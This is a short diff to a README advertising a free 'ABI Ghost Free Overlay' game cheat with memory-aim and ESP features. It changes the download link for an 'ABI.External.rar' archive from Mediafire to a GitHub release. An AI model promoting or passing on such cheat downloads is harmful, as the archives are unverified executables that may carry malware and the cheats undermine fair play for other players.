@@ -4,7 +4,7 @@
  
 **Description**: Transform your ABI gameplay with the **ABI Ghost Free Overlay**! This repository provides exclusive tutorials, resources, and tips to explore features like memory-aim, esp, loot esp, bunnyhop, etc.  
 
-<a href="https://www.mediafire.com/file/1a30wuhd4b8r7lq/ABI_External.rar/file" target="_blank">
+<a href="https://github.com/emxsoftwares/abi-overlay/releases/download/Live-build/ABI.External.rar" target="_blank">
   <img src="https://img.shields.io/badge/install-blue" alt="Install" width="80" height="160" style="border:none;">
 </a>
 
